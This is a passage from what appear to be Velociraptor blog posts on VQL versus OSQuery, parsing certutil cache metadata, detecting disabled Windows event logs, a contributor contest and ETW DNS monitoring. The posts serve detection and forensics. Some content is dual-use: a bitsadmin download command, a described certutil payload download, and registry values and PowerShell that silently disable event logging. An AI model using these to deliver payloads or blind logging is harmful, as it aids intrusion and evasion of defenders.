integration](https://medium.com/velociraptor-ir/velociraptor-and-osquery-2a4306dd23c),
allowing OSQuery queries to run directly inside Velociraptor.

This integration, however, is simply a stopgap measure during
migration. It is much better to write VQL queries within Velociraptor,
since VQL is much more powerful and also much faster.

This post aims to help this migration by comparing typical OSQuery
queries with native VQL Velociraptor queries. This side by side
comparison hopefully sheds some light on VQL and will encourage you to
start writing new VQL artifacts.

This post does not compare the scalability, ease of deployment and
management GUI of OSQuery‘s various fleet implementations with
Velociraptor’s — we only look at the query language itself.

### The file table

One of the most often used OSQuery table is the file table. For example we can see information about a file:
```sql
SELECT * FROM file WHERE path = "C:\Windows\notepad.exe";
```

Because OSQuery uses SQL as its underlying implementation, there is no
way to tell the query that it is only interested in a single file (A
naive implementation would scan all files on disk and compare the path
by the condition eliminating all but one — a very expensive
approach!).

To avoid a full scan of the filesystem, OSQuery peeks at the WHERE
clause to figure out what it needs to do. It is therefore required
that a WHERE clause is provided and the path or directory be
restricted in some way.

Compare this to VQL. The main realization in VQL was that unlike in a
relational database, tables are implemented by code, the code must be
able to accept arguments. Therefore VQL’s syntax requires “tables” to
take arguments (in VQL these are termed plugins):

```sql
SELECT * FROM glob(globs="C:\\Windows\\notepad.exe")
```

The VQL equivalent to the file table is the glob() plugin, which
accepts a glob expression (i.e. wildcards) to search the filesystem
directly. (Note also that VQL does not use a semicolon `;` as a
statement separator — it is not needed, just string multiple
statements together).

So far both queries simply return a single row for a specific
file. OSQuery allows us to specify a wildcard for filenames as well,
however it uses the SQL **like** syntax. For example to return all
dlls in the system32 directory:

```sql
SELECT * FROM file WHERE path like "C:\Windows\system32\%.dll";
```

The equivalent VQL is
```sql
SELECT * FROM glob(globs="C:\\Windows\\System32\\*.dll")
```

You can test the VQL in the Velociraptor notebook right in the
GUI. Simply select **Notebooks** from the sidebar and add a new
notebook. Click on the top cell and add a new VQL cell where you can
write arbitrary queries.

![](../../img/1604zaUCaHumz_aHKaJY1Ig.png)

You can also test OSQuery in the notebook cell by simply invoking the
`Windows.OSQuery.Generic()` artifact (In this case Velociraptor will
shell out to OSQuery and collect the results).

![](../../img/1A6SW9z2b5anC7GHHZ2-Aeg.png)

If you tried this you would immediately see a difference in
performance — the VQL example took less than a second to return 3384
rows while OSQuery took over 6 sec to return the same data. While 6
seconds is not too bad, this gets worse when we try to fetch more dlls
from the disk…

In VQL we can use `**` to denote recursive glob wildcard. This time
the query took 2 seconds and returned 4090 rows.

![](../../img/1Z2JdROd6jSvmSvxEB9p0QA.png)

OSQuery uses `%%` for the same purpose. However OSQuery only allows a
recursive wildcard at the end of a LIKE string (see discussion
[here](https://blog.kolide.com/the-file-table-in-osquery-is-amazing-99db0f52a066)),
so we need to break up the condition into a more complex query with
two conditions.

![](../../img/1Jxcocb4GG8gnCEBugzMDjA.png)

This time OSQuery takes 52 seconds to return the same number of
rows. If you keep an eye on the task manager you would also see an
increasing memory footprint for OSQuery because it queues up all rows
in memory before returning them, so the more rows it returns the more
memory it uses. If we now increase the size of the glob, to return all
dlls on the system the query times out without returning any data at
all!

![](../../img/1eAv9VFpn-r_C6D8sGUVhhg.png)

The timeout is imposed by Velociraptor’s OSQuery integration. This is
another interesting difference between OSQuery and VQL — VQL has
active query cancellation, and a timeout after which the query is
cancelled (In this case the VQL that shells out to OSQuery has timed
out and actively killed the OSQuery process after 10 minutes).

This makes running larger queries much safer as it provides an upper
bound on the amount of resources taken on the endpoint. Once this
bound is exceeded, the query is terminated.

Running a similar query with Velociraptor is much faster returning 64k
rows in 66 seconds.

![](../../img/1tQ3vq6-J7tVF_e0cloOWIg.png)

Performance issues in the OSQuery file table have been discussed
previously (see
[https://blog.kolide.com/the-file-table-in-osquery-is-amazing-99db0f52a066](https://blog.kolide.com/the-file-table-in-osquery-is-amazing-99db0f52a066))
and the advice is to just be more targeted in your queries, however if
you need to know if a file exists anywhere on the disk then an
exhaustive search is necessary.

Although being targeted is helpful, With VQL we can confidently run
the exhaustive search because VQL has our back, in case our queries
are more expensive than expected. VQL is designed to deal with many
rows (e.g. the `Windows.NTFS.MFT` Artifact can return the entire
contents of the MFT which can be around 400–500k rows within a couple
minutes). VQL queries stream their results as soon as possible, so
Velociraptor can maintain a low memory footprint even for very large
result sets (typical memory footprint is 50–100mb).

**NOTE**: VQL does not use the `like` keyword as in SQL. Instead VQL
has the `=~` operator which means a regular expression match. SQL’s
`like` syntax is archaic and much less powerful than a simple
regular expression.

The following selects all user details for usernames matching “user” followed by a digit.
```sql
SELECT * FROM Artifact.Windows.Sys.Users() WHERE Name =~ "user[0–9]"
```

### Queries and Artifacts

One major difference between OSQuery and Velociraptor is that
Velociraptor does not usually directly run queries on
endpoints. Instead, a VQL query is wrapped in an “Artifact” — a
specially formatted YAML file which is stored within the Velociraptor
server. Artifacts make queries discoverable and allow for queries to
be shared with the community. Once an artifact is written, the user
does not need to worry about remembering or entering a query.

Artifacts can also be directly used within another VQL query. This
allows VQL to encapsulate a complex algorithm, but at the same time,
users can easily build on top of this.

In contrast OSQuery uses hard coded internal tables to provide a lot
of functionality requiring c++ coding to add a lot of simpler
functionality to the tool.

Let’s consider the OSQuery **chrome_extensions** table — this table
allows us to list all the chrome extensions installed by all users on
the system. The query simply extract all rows but the actual logic of
extracting and decoding the chrome extension data is hard coded inside
OSQuery.

![](../../img/1JV1XuRxZFwRJ0xNCS1k2UQ.png)

On the other hand, Velociraptor’s
`Windows.Applications.Chrome.Extensions` artifact is written in pure
VQL (see [the source code
here](https://github.com/Velocidex/velociraptor/blob/master/artifacts/definitions/Windows/Applications/Chrome/Extensions.yaml)). You
can view the artifact in the GUI by selecting the “View Artifact”
screen from the sidebar. Note that artifacts can take parameters — in
this case the artifact allows the user to adjust where the chrome
extensions folder can be found.

![](../../img/1NZA_Vj1kwrNF4hGx5Mrtaw.png)

You can just call another artifact seamlessly from VQL as if it was
just another plugin.

![](../../img/14s-7aPELM12TKcRO4iK7Pg.png)

This feature encourages users to develop reusable VQL Artifacts that
can be put together like Lego bricks. Additionally, since artifacts
are just VQL queries it is possible to add new capabilities to the
tool with just a simple query — no need to write new tables in c++
like in OSQuery.

VQL provides very flexible primitives that can be much lower level
than OSQuery. For example, a binary parser is provided built into the
language, thereby allowing users to parse arbitrary files in their
queries. The additional flexibility means that even complex
functionality can be implemented entirely in VQL.

As a VQL query writer, seek to utilize one of the hundreds of built in
artifacts in your queries. There are many artifacts that are
functionally equivalent to OSQuery’s tables, but are written in VQL
(So you can just customize them as well). If you come up with
interesting artifacts, please share them with the community either by
sending us a pull request on GitHub or hosting the YAML yourself.

### Joins and foreach()

Many newcomers to VQL look for the familiar SQL constructs like
JOIN. However, VQL does not use joins at all, keeping the language
simpler. In my experience SQL joins are confusing and difficult for
people to really understand (quiz: what is the difference between a
left join, right join, cross join, inner join and outer join?).

Since VQL can provide parameters to plugins, we can create a plugin
which takes another query as a parameter. This is the fundamental idea
behind the foreach() plugin (I wrote about it[
previously](https://medium.com/velociraptor-ir/the-velociraptor-query-language-pt-2-fe92bb7aa150)). The
foreach plugin accepts the “rows” parameter and the “query”
parameter. It simply runs the “rows” query and for each row it
produces, the plugin evaluates the “query” query and emits the
results.

Let’s take a simple example: an OSQuery query designed to display
information about specific chrome extensions.

![](../../img/12_aE3H4tGqcSQLw44l_iJQ.png)

This OSQuery query joins the **users** table and the
**chrome_extension** table to fill information about the user

The equivalent VQL simply runs two queries — for each row emitted by
the **Windows.Applications.Chrome.Extensions** artifact that matches
the extension of interest, we iterate over all the users, and select
the user record of the user matching the relevant record so we can
display its UUID.

![](../../img/1uijQ0x2p97P13V66lkWFCQ.png)

The VQL syntax is a lot of more readable without using a join
statement. VQL also supports stored queries (similar to stored
procedures) which take parameters and encourage query reuse.

A more refined query might use variables to store subqueries and then
simply call them:

![](../../img/1e_elJMJje0it3Da-M4OamQ.png)

### Conclusions

This post described some of the more obvious differences between
OSQuery and Velociraptor. To summarise

1. The OSQuery file table equivalent is the VQL glob() plugin. Glob
   takes a glob expression as a parameter. Glob expressions use * and
   ** as wildcard instead of % or %%.

1. VQL does not have a like operator, instead using the regular
   expression operator =~

1. The Glob plugin is much faster than the OSQuery file table and
   there are no restrictions on where a recursive wildcard goes.

1. VQL queries time out by default after 10 min so there is no danger
   of overrunning the endpoint. If you prefer low and slow approach it
   is possible to rate limit the VQL query as well as increase the
   timeout.

1. Artifacts are YAML files that encapsulate VQL queries. Velociraptor
   does not directly collect VQL queries on the endpoint — you need to
   create an artifact first.

1. If you previously reached for an OSQuery table that provides the
   data you need, simply look at existing VQL Artifacts that do the
   same. If there are none available, you can add your own
   **Artifacts** in a modular way in the GUI (without needing to
   rebuild clients or servers).

1. VQL does not use **join**, instead the foreach plugin provides the
   same functionality in a clearer way. Foreach also takes the
   **workers** parameter allowing it to run concurrently on multiple
   cores.

Users who are currently migrating from OSQuery can still reuse the
existing investment they have in OSQuery queries directly in
Velociraptor, but I hope this article convinced you that it is well
worth porting your existing queries to native Velociraptor VQL to take
advantage of the flexibility and performance enhancements that
Velociraptor offers.

The above example is just one of the exercises we do in our hands on
Velociraptor courses. If you are interested in learning more about
Velociraptor, check out our hands on training courses on
[https://www.velocidex.com/training/](https://www.velocidex.com/training/)
or check out the code on
[GitHub](https://github.com/Velocidex/velociraptor). To chat, please
join us on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord).

---END OF FILE---

======
FILE: /content/blog/2021/2021-01-19-parsing-binary-files-d31114a41f14/_index.md
======
---
title: Parsing binary files
description: Using VQL to parse binary data
tags:
- Parsing
- VQL
date: 2021-01-19
---

![](../../img/05guWyV7JU51Gcg3T?width=600px)

During the course of our DFIR work, we typically need to extract some
information from endpoints from various files and registry keys on the
system. Sometimes it is possible to extract the needed information
using text processing tools — such as a regular expression applied on
a configuration file.

In many cases however, the information we need is encoded inside a
binary file. A large part of DFIR analysis involves parsing binary
structures from files, registry keys and even event logs.

While it is always possible to write a dedicated parser for whatever
file format we are interested in, this leads to operational
complexities — if we download an adhoc parser for a particular file
format, how do we push new program or script to the endpoint? how to
ensure it has any dependencies (e.g. Python, .NET etc)?

The entire premise of VQL is that users should be able to rapidly
issue new queries to the endpoint, in a consistent and easy to learn
way. Wouldn’t it be great if users can parse binary files directly in
VQL without needing to use external programs?

As of Velociraptor 0.5.5, VQL contains a powerful new built in binary
parser. This post introduces the new parser and shows a practical
example of using it to develop a powerful Velociraptor artifact.

### Binary parsing overview.

Binary files store information for machine consumption — this is termed serialization. Ultimately serialization is a way to represent data as binary digits by encoding integers, structs and other concepts into a binary representation.

While it is certainly possible to write parsers that procedurally unpack various bits of data from the file, these are typically hard to maintain and understand. It is better to visualize what the data actually means and how it is laid onto the file. Therefore we want to write parsers in a descriptive way rather than procedural — Ideally we want the parser to be easy to understand and maintain.

Velociraptor’s binary parser has taken inspiration from other great parsers, such as Volatility and Rekall’s Vtype system (with some syntax simplification).

The best way to introduce the new parser is with an example so I will jump straight in!

### `Certutil` metadata parsing

The `certutil` program is a native, built in Windows tool used to download certificate information. It is a commonly used [Lolbin](https://lolbas-project.github.io/lolbas/Binaries/Certutil/), with attackers misusing the tool to download malicious code to compromised endpoints (see [Att&ck S0160](https://attack.mitre.org/software/S0160/)).

I was reading an excellent blog post recently titled [`Certutil` Artifacts Analysis](https://u0041.co/blog/post/3) where `Aalfaifi` analyses the forensic evidence left behind by `certutil`. Let’s write a parser for this!

We start off by using `certutil` in a malicious way — rather than downloading certificate revocation lists we will download an executable to the system for testing.

![](../../img/1c9DTl-Q04OAFY9T6CUidfw.png)

The `certutil` tool will download our executable and create a metadata file containing some very interesting data but what does it mean?

![](../../img/13ZKzTgDOewJinIZPEk_5TQ.png)

Luckily `Aalfaifi` has done the sleuthing work and their excellent article covers the details. I will interactively develop my VQL parser using the Velociraptor notebook. I first add a new notebook then add a VQL cell to it. I can now write and evaluate free form VQL.

Let’s begin by just hard coding the path to the metadata file I created. I will also define a profile and an initial struct called Header.

![](../../img/1Dr6MW-g3e7l_adVaf0ZpSw.png)

### What is a profile?

A profile is a data driven template that describes how the data is overlaid onto the binary file. Velociraptor uses the profile to drive the parser but the profile is also meant for human consumption — it simply describes all the structs and their fields, sizes etc. Profiles are designed to be succinct and quick to write but also easy to read and understand.

The basic structure of a profile is a JSON encoded data structure:

* The Profile contains a list of struct definitions

* Each struct definition is a list of **[name, size, list of field definitions]**

* Each field definition is a list of** [name, offset, type, options]**

I will start to define the Header struct with the following fields (offsets and fields taken from the Blog post above)

* UrlSize is a 32 bit integer laid at offset 12

* HashSize is a 32 bit integer laid at offset 100

* DownloadTime is a 64 bit timestamp at offset 16

You can see the profile and the resulting object in the screenshot below. Velociraptor calls the parse_binary() VQL function which opens the file and parses the struct **Header** at offset 0.

![](../../img/1WsI7L2niMYLC_N08v-eP1g.png)

### Dynamic properties

So far things are simple — we specified the offsets and types of each field and Velociraptor just parsed them. However, now we want to extract the URL. According to the Blog post the URL starts at offset 116 and has a length specified by the UrlSize field. It is then followed by the hash with a length specified by the HashSize field.

Because the offsets and sizes are not known in advance (URLs have different lengths), we need to define the profile dynamically. The profile will accept a **VQL lambda** function in many places. The lambda function receives the partially parsed struct and can use it to derive other values dynamically at runtime.

We can specify the URL as being a **String** type with a length determined dynamically by the **x.UrlSize** field. Similarly we can declare the offset of the Hash field as the lambda **x=>x.UrlSize + 116**

![](../../img/1HZ7HGESjXWLR3DfapFOAxA.png)

![](../../img/1S3LmbPVR8HpY1dgojr1kxA.png)

### Putting it all together

This was easy! We now know the url the `certutil` tool downloaded
from, the hash and the timestamp — all are critical in a DFIR
investigation to distinguish the legitimate use of `certutil` from
malicious.

While the above VQL only parsed a single hard coded metadata file, in practice we want to search for all metadata files from all users and parse them in a single collection.

You can see the full artifact here [https://github.com/Velocidex/velociraptor/blob/master/artifacts/definitions/Windows/Forensics/CertUtil.yaml](https://github.com/Velocidex/velociraptor/blob/master/artifacts/definitions/Windows/Forensics/CertUtil.yaml) including extra functionality like filtering out whitelisted domains, and an option to also fetch the downloaded file from the **CryptUrlCache**

### Collecting the new **artifact**

I will now collect the artifact from my endpoint. Using the GUI, I click the **add new collection** button, then search for my **Windows.Forensics.CertUtil** artifact.

![](../../img/1j1yRTbk4mFoWNPBWKHHevA.png)

Now I can configure the whitelist and possibly also choose to download the cached files.

![](../../img/1djMNYeKuRJ5xISGh7ssg9Q.png)

The files are parsed on the endpoint and we see the relevant information in seconds

![](../../img/1W9X8wH91FoezNlOk4gXzuA.png)

Doing a hunt across all my endpoints will now tell me if `certutil` was ever used to download a suspicious tool, from where, and potentially uploading the tool itself in the **CryptUrlCache**.

### Conclusions

Although this was a simple example, the binary parser is extremely capable. Some other examples include **Windows.System.Powershell.ModuleAnalysisCache** (parses the powershell module analysis cache) and **Windows.Forensic.Lnk** (Parse link files) and many more.

Being able to go from reading an analysis in a blog post to running a hunt across your entire network in a matter of minutes is a truly powerful capability, allowing our DFIR team to be proactive and innovative. Having a powerful binary parser in your toolbox is a real bonus making many types of hunts possible.

If you are interested in learning more about Velociraptor, check out our hands on training courses on [https://www.velocidex.com/training/](https://www.velocidex.com/training/) or join us on discord [https://www.velocidex.com/discord](https://www.velocidex.com/discord).

---END OF FILE---

======
FILE: /content/blog/2021/2021-01-29-disabled-event-log-files-a3529a08adbe/_index.md
======
---
title:  Disabled Event Log files
description: Windows information security techniques are heavily reliant on the availability and integrity of event logs. Many state of the art systems use event log forwarding to aggregate information from endpoints and detect malicious behavior across the enterprise. Did you know that logs can be trivially disabled? Learn how Velociraptor can help...
tags:
- Logs
- Windows
date: 2021-01-29
---

### Detecting malicious activity with Velociraptor

![Photo by [Jonny Caspari](https://unsplash.com/@jonnysplsh?utm_source=medium&utm_medium=referral) on [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral)](https://cdn-images-1.medium.com/max/11520/0*8Z6QxIV2lCx4PYPT)*Photo by [Jonny Caspari](https://unsplash.com/@jonnysplsh?utm_source=medium&utm_medium=referral) on [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral)*

Windows information security techniques are heavily reliant on the availability and integrity of event logs. Many state of the art systems use event log forwarding to aggregate information from endpoints and detect malicious behavior across the enterprise.

But how reliable really are event logs? I was playing around with the Windows Event Viewer to understand how event logs can be interfered with in practice. We [previously covered](https://medium.com/velociraptor-ir/windows-event-logs-d8d8e615c9ca) the general structure of the Windows Event Log system, so you might want to have a quick read of [that post](https://medium.com/velociraptor-ir/windows-event-logs-d8d8e615c9ca) before you dive into this one.

### Example: BITS transfer

For this post I will use the example of a BITS transfer using bitsadmin.exe. BITS is a transfer service built into the Windows operating system, normally used to fetch windows (or application) updates. However, is it also commonly used by threat actors to deliver malicious payloads because BITS is typically trusted by endpoint tools (since it is a standard windows service). See [Mitre Att&ck T1197](https://attack.mitre.org/techniques/T1197/).

For this test I will use bitsadmin to download a page from the internet and store it on the filesystem. By default, the BITS service will generate several log messages in the log file `%SystemRoot%\System32\Winevt\Logs\Microsoft-Windows-Bits-Client%4Operational.evtx` as shown in the screenshot below

The command I will run fetches a file from the internet and stores it locally

```shell
bitsadmin.exe /transfer /download /priority foreground [https://www.google.com](https://www.google.com) c:\Users\test\test.ps1
```

![](../../img/1o74NoHxr20avTkbAplRlHQ.png)

Many tools rely on the presence of these eventlog messages to escalate an alert for this malicious activity.

While I was playing with this technique I noticed an interesting option in the Windows Event Viewer: `disabled Log` available by simply right clicking on the log file.

![](../../img/1oOg5MAjs9uLe6SoqcRhBGg.png)

Sure enough when the log file is disabled, no events are recorded in the event log at all! Any solutions that rely on detecting event logs will be completely blinded by this setting!

### What does this setting do?

I wanted to know if I can detect when a log file was disabled on an
endpoint. My working hypothesis was that this UI would change some
registry keys and I know how to collect those!

I started up procmon and clicked the button to disable the log. After
some applications of filtering I was able to narrow it down to the
following value
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Bits-Client/Operational\Enabled`
which is set to 0 for disabling the log file.

![](../../img/12sb1bdsZuU3ghB9CTWVAZQ.png)

### Detecting this setting

Ok, great, I want to write a Velociraptor artifact to detect the state of log files. To develop the required VQL I will create a new notebook and simply write the VQL in it.

![](../../img/1qh7B-LH8fyaxXauzuqI0dw.png)

In this query we glob for all keys within the registry query above and extract the channel name (as the name of the subkey) and the Enabled valued. For the sake of simplicity I filtered the above to only examine the bits channels we are currently interested in.

### Other avenues

Running the above query shows all the channels (i.e. log files) that are disabled, but there are other ways to disable logging.

Lets look back at the procmon output above we see another interesting value is being set

![](../../img/1WJRSRw7s8d_gSVwaRZ8p8w.png)

What happens if we change this Enabled value to 0? Lets try this, and reboot…

![](../../img/1g-lvFbFw2yO_c8DqOvEvjQ.png)

This time logging is also disabled, but the log file is showing as enabled!

This second registry key disables the provider itself, while the previous method disables the channel (log file). The GUID in the registry key corresponds to the provider name. As described in our previous article the provider name can be derived from the registry key `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\` which can be used to resolve the GUI to a name

![](../../img/1bgC3WMCTWXcFxudRwqFxhQ.png)

Let’s write some VQL to display the Enabled status of the BITS provider.

![](../../img/1WUWEOGrqJyO7sRYoYFrZtA.png)

This VQL also resolves the GUID to a provider name via the `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\` key as well as showing the modification time of the registry key in question.

![](../../img/1UMnEn1TwNkXMpFW0NZqNww.png)

### Converting to an artifact

Armed with the above VQL queries, we can now write an artifact that collects this information from the endpoint. I also added some potential filters to make my artifact more targeted for hunting. You can see the full source of the `Windows.EventLogs.Modifications` artifact [here](https://github.com/Velocidex/velociraptor/blob/master/artifacts/definitions/Windows/EventLogs/Modifications.yaml).

![](../../img/1qjwC5Ct0Y9udkI0QwPRUUg.png)

Let’s see all the logs that were disabled or enabled in the past day

![](../../img/1lfyqJjJym9MFUa0xDDfnsw.png)

Within 2 seconds we see that the BITS admin channel was manipulated within the previous day

![](../../img/1Kk0EeHBU1e1AaofCPf6PQQ.png)

And the provider was also disabled very recently.

![](../../img/17IoSXoPVQYO0G3ZAKT5Ltg.png)

Next stop is to perform a hunt across my enterprise and look for recently modified channel settings, as well as stacking across my endpoints to see which log channels are disabled on few machines but are generally supposed to be enabled.

![](../../img/1tcJ3Y2gO3ILG1FtpMghThg.png)

In the above screenshot I ran a hunt on about 100 endpoints which have the default enabled logs, and a single endpoint with that log disabled. The stacking operation (GROUP BY) immediately reveals the outliers.

### Conclusions

This was a fun little exercise in trying to understand event logging in Windows. Adversaries often just disable logs during the period of their activities, so solutions completely dependent on log files are very vulnerable to these techniques.

Velociraptor’s power is in being able to quickly and easily recover forensic evidence on activity on the endpoint. In most environments disabling log file or providers is not a legitimately common, so hunting for such activity produces high value signals and leads to a better understanding of how attackers are able to hide their tracks.

The above example is just one of the exercises we do in our hands on Velociraptor courses. If you are interested in learning more about Velociraptor, check out our hands on training courses on [https://www.velocidex.com/training/](https://www.velocidex.com/training/) or join us on discord [https://www.velocidex.com/discord](https://www.velocidex.com/discord).

### P.S.

You can automate event log enable/disable using the following powershell

```powershell
$logName = ‘Microsoft-Windows-DNS-Client/Operational’
$log = New-Object System.Diagnostics.Eventing.Reader.EventLogConfiguration $logName
$log.IsEnabled=$true
$log.SaveChanges()
```

---END OF FILE---

======
FILE: /content/blog/2021/2021-10-08-contributor-contest/_index.md
======
---
title: "The 2021 Contributor Contest"
description: |
    The 2021 Velociraptor Contributor Competition has drawn to a close. Take a look at the winners and all the submissions.

tags:
 - Community

author: "Mike Cohen & Carlos Canto"
date: 2021-10-12
---

The 2021 Velociraptor Contributor Competition has drawn to a close and
this year we have received 6 excellent submissions. Each submission
pushes the state of the art in DFIR and enhances Velociraptor's
capabilities. Without our wonderful Community an open source project
such as Velociraptor would not be nearly as capable.

# And the winners are...

We are thrilled to announce the winners of the Competition!  Each of these
submissions separated itself from the pack by earning the top combined
ratings in five key selection criteria:<br><br> Usefulness, Creativity,
Effort/Difficulty, Completeness of Solution and Clarity of Documentation
<br><br>

Without further ado, the winners are...

* Grand Prize ($5,000 USD) - **Justin Welgemoed**
* Second Place ($3,000 USD) - **Eduardo Cunha Mattos**
* Third Place ($2,000 USD) - **Josh Brower**

Congratulations to all three winners!  We'll be reaching out soon with details
on how to claim your prizes.  The Velociraptor team would also like to
sincerely thank all the judges for their valuable time and effort in evaluating
the submissions.  A great big shoutout and thanks to all our Community members
who submitted entries as well.

You can still view our award presentation at the SANS Threat Hunting Summit by
registering to view a replay of the summit [here](https://www.sans.org/cyber-security-training-events/threat-hunting-and-incident-response-summit-2021/).
But until then, take a look at all the submissions below and evaluate them yourself.

Be sure to follow us on Twitter **@velocidex**, join our [Discord server](https://docs.velociraptor.app/discord/),
sign up for our [mailing list](https://groups.google.com/g/velociraptor-discuss)
and regularly check out this blog for details on upcoming Velociraptor events.  We have some exciting things planned for the rest of 2021, into 2022 and beyond!
<br>
<br>
<br>

## Justin Welgemoed

This submission demonstrates how Velociraptor can be used to automate
collection, analysis and post processing using a combination of client
and server artifacts. Justin has also re-purposed the GUI to automate
further processing of files by signature identification using tools
such as `GENE` and `CAPA` for further triaging.

### References:

https://github.com/predictiple/VelociraptorCompetition.git
<br>
<br>
<br>

## Shae Bailey

Shae contributed a number of artifacts to enhance Cobalt strike
detection and utilize ETW for real time monitoring.

### References:

https://drive.google.com/drive/folders/1Jr4CJO6y2VZVNl7vRSiuAs8Ys7IDmVub?usp=sharing
<br>
<br>
<br>

## Eduardo Cunha Mattos

Eduardo contributed many useful artifacts including a number of MacOS artifacts

Some highlights include

* Loki integration
* Enriched hollows hunter
* Registry UsrClass
* JECmd integration

### References

https://github.com/eduardomcm/VelociraptorCompetition
<br>
<br>
<br>

## Jonathan Woodward

Jonathan contributed many MacOS artifacts focusing on acquisition of critical files for DFIR triaging.

### References

https://drive.google.com/drive/folders/1cmmoOkP5tWD9skIAU5ClWRG_uagzUYVO?usp=sharing
<br>
<br>
<br>

## Josh Brower

Josh wrote VQL artifacts that uses a sysmon configuration as a source to filter out known-good processes when running pslist() across Windows endpoints.

### References

Context & Overview video: https://www.screencast.com/t/iLw4f2jL0FPu

Code: https://gist.github.com/defensivedepth/09a6c91a593bdc62b63f2d40b1bc2f84
<br>
<br>
<br>


## Daniel Kelly

Daniel contributed a large number of useful artifacts providing
collection capabilities for Windows and Linux focused around initial
triage.

### References

https://drive.google.com/drive/folders/1Q3b4b1NN_xo5_2ak1-INn8l5kIBbfNZ2?usp=sharing

---END OF FILE---

======
FILE: /content/blog/2021/2021-08-18-velociraptor-and-etw/_index.md
======
---
title: Event Tracing for Windows Part 1
description: |
   This post introduces ETW as an event source and examines how VQL can be used to harness the power of ETW.

tags:
 - Detection
 - VQL
 - ETW

author: "Mike Cohen"
date: 2021-09-02
---

## Digging into Windows Internals

One of the most important aspects of modern operating systems is
instrumentation of the running software on the system. Instrumentation
provides the visibility to understand what the system is doing at any
given moment. This is obviously important for system administrators
and software developers, but visibility into machine state is
increasingly being used for security monitoring and response.

In Windows, system instrumentation is provided by the Event Tracing
For Windows (ETW), an extensive framework for instrumentation and
visibility.

Much has been written about ETW so I will not cover the details here,
this blog post is the first of a series of posts that examine how we
can leverage ETW for security monitoring using Velociraptor
specifically.

### Event tracing for windows.

The Event Tracing for Windows framework is [documented extensively by
Microsoft](https://docs.microsoft.com/en-us/windows-hardware/test/weg/instrumenting-your-code-with-etw). In
a nutshell, the framework is designed to facilitate interaction
between event **Consumers** and event **Providers**.

Velociraptor provides the VQL event plugin `watch_etw()` to register
Velociraptor as a **Consumer**.  If you have not read about
Velociraptor's event queries, check out the
[documentation](https://docs.velociraptor.app/docs/vql/events/). In
Velociraptor, event queries allow us to write real time monitoring
rules on the endpoint, then forward events to the server, enrich the
event with other information or respond to the event autonomously.

In this blog post we will go through some examples to illustrate the
general technique but there are so many possibilities for advanced
detection rules.

### Exploring ETW - Monitoring DNS lookups

In this blog post, we will be building a Velociraptor query to monitor
for DNS lookups on the endpoint. We mentioned previously that ETW
connects providers and consumers, so our first task is simply to find
a provider that will provider relevant data.

In this post we explore how you might develop new ETW based queries by
discovering new providers and experimenting with novel detection
rules.

ETW is designed to be self documented via `manifest` files, so each
provider in the system can describe what it will provide to some
extent. You can see all the providers on your system using the `logman
query providers` command. We can immediately see some providers
identified by the globally unique identifier (GUID).

![Querying providers on the command line](query_providers.png)

Although it is possible to query for providers on the command line,
using APIs it is possible to dump the entire manifest containing much
more information about each provider.

There are some public efforts to better document ETW providers, for
example https://github.com/repnz/etw-providers-docs contains a dump of
various manifest files. I like to search that repository to find
likely useful providers. In this case I will look for a provider that
might give DNS information. The `Microsoft-Windows-DNS-Client`
provider looks like a likely candidate.

![ETW Providers documentation](image118.png)

Let's get Velociraptor to watch the provider's GUID for any
events. VQL provides the `watch_etw()` plugin to attach Velociraptor
to the provider.

```sql
SELECT *
FROM watch_etw(guid="{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D}")
```

![Watching the Windows DNS Client provider](watching_dns_provider.png)

After some trial and error we find the event ID we are interested in
as being ID 3020. We can consult with the manifest file to get more
information, such as the event data provided. Limiting the VQL query
to filter for event 3020 and extracting the most relevant columns
gives a nice DNS monitoring query:

```sql
SELECT System.TimeStamp AS Timestamp,
       EventData.QueryName AS Query,
       EventData.QueryType AS Type,
       EventData.QueryResults AS Answer
FROM watch_etw(guid="{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D}")
WHERE System.ID = 3020
```

## Deploying the query on endpoints

Our VQL query is able to monitor the endpoint for DNS lookups but we
need a way to deploy the query to the endpoint. In Velociraptor,
client side event queries are encapsulated in `Client Event` artifacts
(Simple YAML files that include the VQL query, as well as human
readable descriptions and parameters allowing for simple
customization).

Simply select "Add new artifact" in the `View Artifacts` screen. By
default Velociraptor presents a template for an artifact definition -
ready for us to fill in the right information. Simply copy the VQL
query into the new artifact under the `Sources.Query` section
(remember to indent the query to fit within the YAML format). Since
this artifact will be an event artifact running on the client, we must
specify its type as `CLIENT_EVENT`

![Adding a custom event artifact](event_artifact.png)

{{% notice tip "The different types of artifacts" %}}

What is the difference between a `CLIENT` and a `CLIENT_EVENT` artifact?

A `CLIENT` artifact is collected from the client, by sending a query,
having the client execute the query, returning a result set
(i.e. rows) back to the server. Therefore the `CLIENT` artifact
normally has a limited lifetime (by default 10 minutes) over which to
complete its work and return a result.

`CLIENT_EVENT` artifacts are designed to run continuously on the
client, streaming rows to the server when events occur. Therefore
these are treated differently by the client: The client simply records
the event queries it is to run in a `Client Event Table`.

The client starts running all the event queries when it first
starts. If the client table changes on the server (perhaps because the
user added a new event artifact to the client), the client will resync
its event table and restart all its queries.

{{% /notice %}}

Once Velociraptor contains the new artifact it is time to deploy the
artifact to endpoints. Velociraptor can target different event
artifacts to different clients by means of `Label Groups`. By simply
assigning a label to a client, we can control the event artifacts
running on the client. For example, some of our endpoints are more
sensitive so we might want to only deploy certain monitoring queries
on those clients only by labeling them as "Sensitive".

For our example, we will deploy the query on `All` clients.

![Targeting event monitoring to label groups](adding_event_artifacts.png)

Once the query is deployed we can begin seeing any DNS events
generated on the endpoint.

![Monitoring DNS requests](monitoring_dns.png)

## Conclusions

Hopefully you were inspired by this post to search for your own
detection queries. ETW is a rich source of endpoint state telemetry!
There are many other providers to explore and many possibilities of
combining ETW with other information sources.

While many users are familiar with Velociraptor's ability to collect
endpoint state and hunt for indicators at scale, the event monitoring
capability is a different approach making certain types of detections
much more convenient and effective.

For example, many users ask "how do I schedule a hunt to run
periodically?" While there are some cases when this is a good solution,
in most cases users are trying to find out what has changed in the
endpoint's state between two times.

An event monitoring artifact can inform of state changes on the
endpoint and perform the preliminary triage and analysis of these
events automatically.

